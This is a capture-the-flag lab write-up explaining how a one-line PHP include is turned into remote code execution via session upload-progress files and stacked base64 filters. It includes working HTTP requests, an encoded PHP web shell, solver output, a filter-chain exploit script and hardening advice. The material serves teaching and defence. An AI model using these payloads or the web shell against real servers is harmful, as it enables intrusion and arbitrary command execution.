# 11 — One Line PHP — Writeup

## TL;DR

`session.upload_progress` writes attacker-controlled bytes into
`/var/lib/php/sessions/sess_<id>` on a request that never calls
`session_start()`, and we choose `<id>`. The record is deleted when the upload
ends, so we never end it: the POST announces 6 MiB (under the stock 8 MiB
`post_max_size`) and delivers 32 KiB, and the session file sits there for as
long as we hold the socket. PHP puts a
fixed `upload_progress_` prefix in front of our data, so we launder it through
three stacked `convert.base64-decode` filters — the filter skips every
non-base64 byte, and with two short padding strings the prefix degenerates
into three bytes that the last decoder skips as well. The include then sees
`@<?php echo shell_exec($_GET[1]);?>` at offset 0.

Flag: `PHRACK{upload_progress_wrote_my_shell_for_me}`

## The bug

The application is the original challenge, verbatim:

```php
<?php ($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);
```

`file($_)` and `include($_)` both go through PHP's stream layer, so `$_` may be
a `php://filter/...` URL and the *same* filter chain is applied to both the
check and the execution. There is no file-read primitive: the result of
`file()` is compared, never printed.

### Why a session file exists at all

`ext/session/session.c` registers an RFC1867 (multipart upload) callback,
`php_session_rfc1867_callback()`. On `MULTIPART_EVENT_FORMDATA` it looks for a
field whose name equals `session.upload_progress.name`; if it finds one it
starts the session module *for that request*, no matter what the script does.
On `MULTIPART_EVENT_FILE_START` it builds the progress array and calls
`php_session_rfc1867_update()`, which runs `php_session_initialize()` and then
flushes — i.e. it writes the session file to disk immediately, mid-upload.

The session key is `session.upload_progress.prefix . <value of that field>`,
and the session *file* is `session.save_path . "/sess_" . session_id()`, with
the session id taken from our `PHPSESSID` cookie (`session.use_strict_mode=0`,
the PHP 7.2 default, means an unknown id is accepted as-is).

### The php.ini this lab ships

`challenge/Dockerfile` writes this file, and `README.md` reproduces it verbatim
so the player can read the box's configuration exactly as the original
challenge published its own:

```ini
allow_url_fopen = On
allow_url_include = Off
file_uploads = On
upload_max_filesize = 2M
post_max_size = 8M
max_execution_time = 30
session.save_path = "/var/lib/php/sessions"
session.auto_start = Off
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.upload_progress.freq = "1%"
session.upload_progress.min_freq = "1"
expose_php = Off
```

Provenance, measured rather than assumed:

```
$ docker run --rm php:7.2.34-cli php -r 'echo ini_get("post_max_size"), " ",
                                         ini_get("upload_max_filesize"), "\n";'
8M 2M
$ docker run --rm php:7.2.34-cli grep -nE '^(post_max_size|upload_max_filesize)' \
      /usr/local/etc/php/php.ini-production
669:post_max_size = 8M
822:upload_max_filesize = 2M
```

So everything above is PHP 7.2's own default — compiled-in, and identical to
`php.ini-production` — with exactly two exceptions:

* `session.save_path` is the Debian/Ubuntu *package* default. Upstream leaves
  it empty (i.e. `/tmp`); Debian points it at `/var/lib/php/sessions` and
  creates that directory `1733 root:root`, which is what makes it unlistable.
* `expose_php = Off` is a deliberate deviation (upstream defaults to `On`). It
  is cosmetic.

An earlier revision of this lab shipped `post_max_size = 64M` and called it a
default. It is not, and the technique never needed it: `rfc1867_post_handler()`
refuses to parse a body whose `Content-Length` exceeds `post_max_size` *before*
it ever reaches the progress callback, so the exploit simply announces less
than 8 MiB. Measured against this image:

```
Content-Length: 33554432 (32 MiB), post_max_size = 8M  ->  no session file at all
Content-Length:  6291456  (6 MiB), post_max_size = 8M  ->  sess_<id>, 328 bytes
```

| setting | value | why it matters |
|---|---|---|
| `session.save_path` | `/var/lib/php/sessions` | the path we will include; the directory is `1733 root:root`, so it cannot be listed, only written into |
| `session.upload_progress.enabled` | `On` | the whole primitive |
| `session.upload_progress.cleanup` | `On` | the record is dropped when the upload ends — this is the "race" |
| `session.upload_progress.prefix` | `upload_progress_` | the 16 bytes that stand between us and `@<?php` |
| `session.upload_progress.name` | `PHP_SESSION_UPLOAD_PROGRESS` | the magic field name |
| `session.upload_progress.freq` / `.min_freq` | `1%` / `1` | updates are rare, so the record stays *stable* while we hold the upload |
| `session.serialize_handler` | `php` | gives the `key|serialized` on-disk layout |
| `session.auto_start` | `Off` | the script never starts a session; upload progress does it for us |
| `session.use_strict_mode` | `0` | our arbitrary `PHPSESSID` is accepted, so the path is predictable |
| `allow_url_include` | `Off` | kills RFI and `include('data://...')` — including through `php://filter` |
| `allow_url_fopen` | `On` | default; irrelevant to the solution |
| `file_uploads` | `On` | needed for RFC1867 parsing to happen at all |
| `post_max_size` | `8M` | the stock default. It caps the `Content-Length` we may announce, so the exploit claims 6 MiB |
| `upload_max_filesize` | `2M` | the stock default. Irrelevant here: we never finish a file, and the progress *value* is a form field, not a file |

PHP is pinned to `php:7.2.34-apache`, the last 7.2 release — the original ran
on Ubuntu 18.04 + Apache + PHP 7.2.

## Building the exploit

### 1. Get a file on disk

```
POST / HTTP/1.1
Cookie: PHPSESSID=deadbeef02
Content-Type: multipart/form-data; boundary=----------X
Content-Length: 6291456            <-- we lie (and stay under post_max_size)

------------X
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

MARKERVALUE
------------X
Content-Disposition: form-data; name="f"; filename="a.txt"
Content-Type: text/plain

AAAAAAAA...                        <-- and then we stop sending
```

While the socket is open:

```
$ ls -la /var/lib/php/sessions/
-rw------- 1 www-data www-data  328 sess_deadbeef02

$ cat /var/lib/php/sessions/sess_deadbeef02
upload_progress_MARKERVALUE|a:5:{s:10:"start_time";i:1789159364;s:14:"content_length";i:6291456;s:15:"bytes_processed";i:5216;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:1:"f";s:4:"name";s:5:"a.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1789159364;s:15:"bytes_processed";i:5216;}}}
```

The content does not change again: `freq = 1%` of the announced 6 MiB is
62914 bytes, so the next update would only happen ~63 KiB further into the
body, and the solver delivers 32 KiB and stops. Measured on the running lab,
the file's md5 is identical three seconds apart while the socket is held. So
this is not a race at all — it is a window we hold open for as long as we
like. (Orange's original exploit raced `cleanup`; he mentions the
"upload a large file" variant as the alternative. This lab takes the
alternative because it makes `verify.sh` deterministic.)

### 2. The prefix problem

The include needs `@<?php` at offset 0, and the file starts with
`upload_progress_`. No stream filter removes bytes from the head of a stream.
`convert.base64-decode`, however, is extremely forgiving — this is PHP's own
`php_conv_base64_decode_convert()`:

* bytes outside `A-Za-z0-9+/` are silently skipped;
* the survivors are consumed four at a time, three bytes out per group;
* `=` is *not* a soft stop (see below).

So the prefix does not have to be removed, it has to be *digested*. Only 14 of
its 16 bytes are base64 characters: `upload_progress_` → `uploadprogress`.

Measured behaviour of a single decoder:

```
"upload_progress_QUJDRA"  ->  ba 99 68 69 da 6b a2 0a de b2 c4 14 24 34 40
"QUJD|RA"                 ->  "ABCD"        (| skipped)
"QUJD RA"                 ->  "ABCD"        (space skipped)
```

### 3. Three decoders, and the alignment arithmetic

Let `pad1` be characters we insert between the prefix and our payload, and
`pad2` characters we insert one base64 layer deeper. Write

```
value = pad1 || base64( pad2 || base64( base64( shell ) ) )
```

and follow the stream through `convert.base64-decode|convert.base64-decode|convert.base64-decode`:

| stage | stream |
|---|---|
| file | `upload_progress_` ‖ `value` ‖ `\|a:5:{...}` |
| after decode #1 | `G1` ‖ `pad2` ‖ `base64(base64(shell))` ‖ junk |
| after decode #2 | `G2` ‖ `base64(shell)` ‖ junk |
| after decode #3 | `shell` ‖ junk |

with `G1 = decode("uploadprogress" ‖ pad1)` and `G2 = decode(base64-chars(G1) ‖ pad2)`.

Three conditions fall out:

1. `14 + |pad1| ≡ 0 (mod 4)` — otherwise our payload is decoded off a group
   boundary and turns to mush. The smallest choice is `|pad1| = 2`.
2. `|base64-chars(G1)| + |pad2| ≡ 0 (mod 4)` — same thing one layer down.
3. **`G2` must contain no base64 character at all.** If it did, decoder #3
   would consume it and shift our payload off offset 0. This is the condition
   that actually picks the padding.

Brute-forcing `pad1` over the 4096 two-character strings and `pad2` over
whatever length condition 2 demands finds a solution instantly —
`solve.py:find_padding()` does it at run time rather than hardcoding it:

```
pad1 = "AA"
G1   = ba 99 68 69 da 6b a2 0a de b2 c0 00      (12 bytes)
       base64 characters in G1:  68 'h', 69 'i', 6b 'k'   -> 3
pad2 = "A"                                       (3 + 1 = 4, condition 2)
G2   = decode("hikA") = 86 29 00                 -> no base64 character
```

Everything below `?>` is `/` filler, appended until no base64 layer needs `=`
padding (`len(shell) % 9 == 0` and `(|pad2| + len(base64(base64(shell)))) % 3 == 0`).

The resulting progress value, for `@<?php echo shell_exec($_GET[1]);?>`:

```
AAQVVVUjNMMk5IYUhkSlIxWnFZVWM0WjJNeWFHeGlSM2htV2xob2JGbDVaMnRZTUdSR1ZrWnplRmhUYXpkUWVqUjJUSGs0ZGt4NU9IWk1lVGgy
```

and the stream, exactly as Orange described it in 2018:

```
file      upload_progress_AAQVVVUjNMMk5IYUhkSlIxWnFZVWM0Wk...|a:5:{...}
decode #1 \xba\x99hi\xdak\xa2\n\xde\xb2\xc0\x00 AUUR3L2NHaHdJR1ZqYUc4Z2Mya...
decode #2 \x86)\x00 QDw/cGhwIGVjaG8gc2hlbGxfZXhlYygkX0dFVFsxXSk7Pz4vLy8v...
decode #3 @<?php echo shell_exec($_GET[1]);?>//////////
```

### 4. The `=` trap, and how to make it deterministic

`convert.base64-decode` does **not** treat `=` as "stop and keep what you
have". `php_conv_base64_decode_convert()` reports a fatal conversion error and
`strfilter_convert_append_bucket()` drops the bucket:

```
"QUJDRA=="            -> "ABCD"     (legal trailing padding, nothing after)
"QUJDRA==ZZZZ"        -> ""         (everything is lost)
"QUJD=RA"             -> ""
```

The session file ends with PHP's own serialised progress array. Decoding it
produces roughly 110 bytes of uncontrolled binary at layer 2 and ~60 more at
layer 3 — and any single `0x3d` in there destroys the whole read. Measured
odds of a clean run: around 50%, and `start_time`/`bytes_processed` change on
every attempt, so the original exploit is naturally a retry loop.

It can be made deterministic. Stream filters run per **bucket**, and the read
buffer is `stream->chunk_size` = 8192 bytes. A bucket that fails only destroys
itself; everything flushed by earlier buckets is already downstream:

```php
// 16000 valid base64 characters followed by "=XYZ"
strlen(file_get_contents("php://filter/convert.base64-decode/resource=$big"));
// => 6144      (bucket 1 survived: 8192 * 3/4)
// the same input at 404 bytes => 0
```

So `solve.py` pads the progress value with `A` filler up to 16 KiB. The
serialised tail then lands in bucket #3, and buckets #1–#2 — which carry our
shell — have long been delivered. `A` filler decodes to NUL bytes, which the
next decoder skips, so it costs nothing downstream. Result: 5/5 clean runs, no
retries.

### 5. Fire

```
GET /?orange=php%3A%2F%2Ffilter%2Fconvert.base64-decode%7Cconvert.base64-decode
     %7Cconvert.base64-decode%2Fresource%3D%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_phrack7201
    &1=cat+%2Fflag.txt
```

```
[*] target       http://challenge
[*] alignment    pad1='AA'  pad2='A'
[*] shell        @<?php echo shell_exec($_GET[1]);?>//////////
[*] progress     AAQVVVUjNMMk5IYUhkSlIxWnFZVWM0WjJNeWFHeGlSM2htV2xob2JGbDVaMnRZTUdSR1ZrWnplRmhUYXpkUWVqUjJUSGs0ZGt4NU9IWk1lVGgyAAAAAAAAAA...
[*]              (16366 bytes total: 110 bytes of payload + 16256 bytes of 'A' bucket filler)
[+] offline simulation: three decoders reproduce the shell
[*] attempt 1: include sess_phrack7201
[+] RCE confirmed, `cat /flag.txt` ran as the web user
FLAG: PHRACK{upload_progress_wrote_my_shell_for_me}
```

One attempt, no retries, with the stock `post_max_size = 8M` in place.

## The exploit

`solve/solve.py`, Python 3 standard library only. Stages:

1. `php_base64_decode()` / `Decoder` — a byte-accurate model of
   `php_conv_base64_decode_convert()`, including the bucket-fatal `=`.
2. `find_padding()` — brute-forces `pad1`/`pad2` against the three conditions
   above at run time.
3. `build_progress_value()` — assembles `pad1 ‖ b64(pad2 ‖ b64(b64(shell)))`
   plus `/` filler plus 16 KiB of `A` bucket padding, and reports how much of
   the result is payload and how much is filler (the solver prints only the
   first 120 bytes of a ~16 KB value).
4. `simulate()` / `run_chain()` — replays the whole filter chain offline,
   bucket by bucket, and refuses to touch the network unless the shell comes
   out at offset 0.
5. `HeldUpload` — a raw socket that sends a truncated multipart body and holds
   it open in a thread.
6. the include request, with the command in `$_GET[1]`.

## Fixing it

The one-liner is beyond saving, but the general rules are:

```php
// never let user input reach include()
$page = basename($_GET['page'] ?? 'home');
$path = __DIR__ . '/pages/' . $page . '.php';
if (!in_array($path, $allowlist, true)) { http_response_code(404); exit; }
include $path;
```

* Include from a hardcoded allowlist. Path sanitisation is not enough: the
  attack here never uses `../`.
* If you must accept a path, reject anything containing `://`. `php://filter`
  is not blocked by `allow_url_include` or `open_basedir`.
* Turn `session.upload_progress.enabled = Off` if you do not use it. It is on
  by default and it is a file-write primitive available to any unauthenticated
  request.
* Put `session.save_path` on a filesystem mounted `noexec`… which does nothing
  for `include()`. The real control is the first bullet.

## Going further

### The filter-chain solve — a second, fully working path

**This lab has a documented alternative solution, and it needs no upload, no
`PHPSESSID`, no `session.upload_progress` and no second request.** It is not a
bug in the lab: it is what actually happened to this challenge after 2021, and
it is exactly the arc Orange describes in §4.1 — filter chains retroactively
trivialised the entire temp-file era of LFI-to-RCE.

Why it works: `file($_)` and `include($_)` are handed the *same* string, and
both go through PHP's stream layer. So a `php://filter` chain that synthesises
bytes out of thin air satisfies the `@<?php` magic-byte check *and* is what
gets executed. loknop's generator (the subject of `labs/12-filter-chain-rce`)
builds a chain whose output starts with any bytes you like, so it can simply
be pointed at the magic string:

```sh
$ cd labs/11-one-line-php && make up
$ python3 - <<'EOF'
import sys, urllib.parse, urllib.request
sys.path.insert(0, "../12-filter-chain-rce/solve")
from solve import build_chain              # lab 12's generator, unmodified

chain = build_chain(b"@<?php echo shell_exec($_GET[1]);?>", resource="php://temp")
url = "http://127.0.0.1:8011/?" + urllib.parse.urlencode(
    {"orange": chain, "1": "cat /flag.txt"})
print(len(chain.split("|")), "filters,", len(url), "bytes of URL")
print(urllib.request.urlopen(url).read()[:60])
EOF
284 filters, 7796 bytes of URL
b'@PHRACK{upload_progress_wrote_my_shell_for_me}\n\x06\xc9\nP\xc3\xe0\x03\xd0\x03\xd0\xf8\x00\xf4'
```

One GET, done. The `@` in front of `<?php` is just leading text that PHP echoes
before the opening tag, which is also why the flag comes back with `@` glued to
it.

Size is the only constraint, and it is not a tight one. The request line for
that payload is 7788 bytes; Apache's `LimitRequestLine` is the compiled-in
default 8190 in this image (nothing in `/etc/apache2` overrides it), so it
fits. Shortening the shell shortens the chain — measured on this lab:

| payload | filters | URL bytes | works |
|---|---|---|---|
| `` @<?php `$_GET[1]`;?> `` | 161 | 4451 | runs, but prints nothing (no `echo`) |
| `` @<?php echo`$_GET[1]`;?> `` | 197 | 5458 | yes |
| `@<?php system($_GET[1]);?>` | 214 | 5878 | yes |
| `@<?php echo shell_exec($_GET[1]);?>` | 284 | 7796 | yes |

A closing `?>` is not optional here: without it the filter chain's trailing
garbage is parsed as PHP and the request dies on `Unexpected character in
input`.

**Why the lab keeps the upload-progress route as the intended one.** The
application is the 2018 one-liner verbatim, and blocking filter chains would
mean either editing Orange's line or crippling the `php://` wrapper — both of
which would make the lab a different challenge. `session.upload_progress` is
what the article's Level 0 is about, the filter chain is what Level 1 is about,
and lab 12 is where the chain is actually taught. Solve it the intended way
first; then come back and do it in one GET, because that contrast *is* the
lesson.

Related labs: `labs/12-filter-chain-rce` (loknop's generator, built from
scratch and explained), `labs/13-filter-chain-oracle` (the same primitives used
to read instead of write), and `labs/20-lfi-classic-toolkit` (the pre-filter-chain
LFI toolkit these techniques replaced).

Historically, this is the well-known post-2021 re-solve of the 2018 challenge:
once @loknop published the `convert.iconv` + `convert.base64-decode`
construction for hxp CTF 2021's "includer's revenge", every LFI whose sink also
accepts a stream wrapper — including this one — became a one-request RCE.

### Other variations

Things this lab deliberately does not implement, and what I actually checked:

* **The real race.** With `cleanup=On` and a *completed* upload, the record
  lives for microseconds; the original solve hammered the include endpoint
  from many threads. The lab keeps the connection open instead. **Tested**:
  the held-upload variant, 5/5. **Not tested**: the threaded race.
* **RealWorld CTF 2018 "One Line PHP Revenge"** — `session.upload_progress`
  disabled, so wupco used a PHP bug in `convert.quoted-printable-encode`
  (uninitialised `lbchars_len`) to crash the process and leave
  `/tmp/phpXXXXXX` upload temporaries behind, then brute-forced the name.
  **Tested here, and it does not reproduce on this image**: the payload
  `php://filter/convert.quoted-printable-encode/resource=data://,%bfA...%ff%ff...`
  kills `php:7.0.9-apache` (exit 255, no output) but is handled cleanly by
  `php:7.2.23-fpm` and `php:7.2.34-apache` (74 bytes out, exit 0). The bug was
  fixed before the last 7.2 releases, so a faithful lab for that variant needs
  an early-7.x image.
* **`/proc/self/fd`** — hxp CTF 2021 "includer's revenge" used nginx's request
  body buffering, which `unlink()`s the file but keeps the descriptor, and
  reached it through `/proc/<nginx pid>/fd/<n>` behind a chain of
  `/proc/self/root` symlinks. **Not applicable here** (Apache + mod_php buffers
  in memory, not in a temp file) and **not tested**.
* **0CTF 2021 "1linephp"** appended `.php` to the path, which was bypassed with
  the `zip://` wrapper over the session file; **Balsn CTF 2021 "2linephp"**
  blocked `zip`/`p:`/`s:` and fell to `register_argc_argv` +
  `/usr/local/lib/php/pearcmd.php` writing a file through PEAR. **Not
  implemented, not tested.**
* **Session data injection proper.** Bug #72681 is about the `php` serializer
  skipping a disallowed key (`_SESSION`, `GLOBALS`) but continuing to parse,
  which lets you inject whole serialized objects. With
  `session.upload_progress.prefix = ""` you control the entire session key and
  the file starts with your bytes — no base64 laundering needed at all. This
  lab keeps the default prefix precisely because dealing with it is the
  interesting part.

## References

* Orange Tsai, "HITCON CTF 2018 - One Line PHP Challenge" —
  <https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/>
* Taoguang "Ryat" Chen, PHP bug #72681, "PHP Session Data Injection
  Vulnerability" (CVE-2016-7125) — <https://bugs.php.net/bug.php?id=72681>
* Ginoah & Bookgin, "One Line PHP: From Genesis to Ragnarök" —
  <https://hackmd.io/@ginoah/phpInclude>
* Yuhang "wupco" Wu, "One Line PHP Challenge without session.upload" —
  <https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view>
* Bruno "0xbb" Bierbaumer, "hxp 36C3 CTF / includer" —
  <https://ctftime.org/task/10249>
* waderwu (@yxxx), "0CTF 2021 / 1linephp" —
  <https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2021/1linephp/writeup/1linephp_writeup_en.md>
* Kaibro, "Balsn CTF 2021 / 2linephp" —
  <https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#2linephp>
* Gynvael Coldwind, "PHP LFI to arbitrary code execution via rfc1867 file
  upload temporary files" —
  <https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf>
* Brett Moore, "LFI with PHPInfo() Assistance" —
  <https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf>
* Orange Tsai, "The Art of PHP - My CTF Journey and Untold Stories!",
  Phrack #72, section 4.1.
